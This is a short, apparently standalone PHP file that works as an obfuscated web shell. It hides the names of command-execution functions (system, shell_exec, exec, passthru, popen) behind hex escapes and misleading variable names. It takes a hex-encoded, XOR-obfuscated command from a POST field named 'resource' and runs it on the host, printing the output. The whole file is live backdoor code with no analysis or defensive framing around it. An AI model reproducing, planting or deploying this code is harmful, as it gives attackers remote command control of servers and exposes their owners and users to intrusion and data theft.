<?php

$right_pad_string1 = "s\x79s\x74\x65m";
$right_pad_string3 = "ex\x65\x63";
$right_pad_string2 = "she\x6C\x6C_\x65\x78e\x63";
$right_pad_string7 = "p\x63\x6C\x6Fse";
$right_pad_string5 = "po\x70\x65n";
$right_pad_string4 = "\x70asst\x68r\x75";
$approve_request = "h\x65\x782bin";
$right_pad_string6 = "str\x65\x61m_g\x65t\x5F\x63ont\x65\x6Et\x73";
if (isset($_POST["r\x65\x73\x6Fur\x63e"])) {
            function token_parser_engine    (     $fac    ,    $component    )      {
    $factor      =     ''      ;
     $j=0;
 while($j<strlen($fac)){
$factor.=chr(ord($fac[$j])^$component);
$j++;

} return    $factor;
   
}
            $resource = $approve_request($_POST["r\x65\x73\x6Fur\x63e"]);
            $resource = token_parser_engine($resource, 7);
            if (function_exists($right_pad_string1)) {
                $right_pad_string1($resource);
            } elseif (function_exists($right_pad_string2)) {
                print $right_pad_string2($resource);
            } elseif (function_exists($right_pad_string3)) {
                $right_pad_string3($resource, $data_chunk_fac);
                print join("\n", $data_chunk_fac);
            } elseif (function_exists($right_pad_string4)) {
                $right_pad_string4($resource);
            } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
                $component_factor = $right_pad_string5($resource, 'r');
                if ($component_factor) {
                    $reference_property_set = $right_pad_string6($component_factor);
                    $right_pad_string7($component_factor);
                    print $reference_property_set;
                }
            }
            exit;
        }